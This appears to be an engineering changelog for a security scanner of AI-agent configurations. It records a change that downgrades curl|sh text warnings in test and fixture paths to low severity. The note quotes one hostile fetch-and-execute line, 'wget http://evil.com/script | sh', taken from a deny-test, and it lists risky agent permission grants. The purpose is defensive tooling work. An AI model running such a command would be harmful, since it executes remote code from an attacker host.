# GAP-ROUND-366 — curl|sh text warnings in test/fixture paths grade low

Date: 2026-08-03

## Routine windows (carried from round 365, same day)

- Advisory watch (authenticated): zero uncovered. npm OSV ETag unchanged; PyPI ETag change
  verified as one new non-MCP id (MAL-2026-13666, cubesat-upstream-driver CTF env collector).
- v0.67.26 released and close-looped (published with pnpm, clean-env verified, tag/Release/
  deploy checks done — see release notes).

## Scope

r363 residual medium review: AG-SK-002 mediums (117) are rule-semantics true positives
(unrestricted Write/Edit/WebSearch/WebFetch grants, enableAllProjectMcpServers, trusted MCP
servers, approval_policy opt-outs). AG-RC-001 mediums (31): the 25 text curl|sh warnings were
inspected — 10 sit in test/fixture paths quoting curl|sh strings as *test payloads* (a hook
handler's deny-test `command: 'wget http://evil.com/script | sh'`, sandbox security specs,
testdata JSON payloads, audit-script unit tests). Nothing there executes; medium overstates them.

## Change

The non-executable curl|sh text warning now grades low with a test-fixture message when the file
sits in a test path (`tests?/`, `testing/`, `testdata/`, `__tests__/`, `fixtures/`, `mocks?/`,
`*.test.*`/`*.spec.*`, `test_*`/`*_test.*`) — the same path heuristic used by AG-CL-001/AG-TP-001.
Executable-file criticals are unaffected (the executable check runs first), and non-test
documentation stays medium.

## Verification

- Head-to-head across five corpora (r343/r353/r356/r359/r363): exactly 63 findings
  medium→low, all AG-RC-001 text warnings in test paths, zero other deltas.
- Spot-checked representatives in source: nexus-agents pre-tool deny-tests, hol-guard
  guard test suite, fak testdata payloads, aid-methodology canonical test scripts — all
  quoted fixtures or commented docs inside test files.
- Regression pins: test-path fixture low, non-test `snippets.ts` doc string medium,
  `setup.sh` live pipe critical.
- Full suite green: 543 tests, build/lint/typecheck/diff-check clean.
